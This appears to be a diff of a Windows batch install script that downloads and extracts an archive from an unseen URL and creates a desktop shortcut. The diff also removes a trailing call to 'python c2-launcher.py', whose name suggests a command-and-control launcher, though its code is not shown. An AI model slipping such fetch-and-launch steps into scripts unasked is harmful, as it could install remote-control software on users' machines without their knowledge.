@@ -8,7 +8,7 @@ for %%F in ("%url%") do set "filename=%%~nxF"
 
 if not exist "%filename%" (
     curl -o %filename% -LJO "%url%"
-    powershell -command "Expand-Archive -Path %filename% -DestinationPath ."  
+    powershell -command "Expand-Archive -Path %filename% -DestinationPath ."
     del %filename%
 )
 
@@ -38,5 +38,3 @@ powershell -Command ^
 echo Shortcut created at %DESKTOP_PATH%
 
 echo Done!
-
-python c2-launcher.py
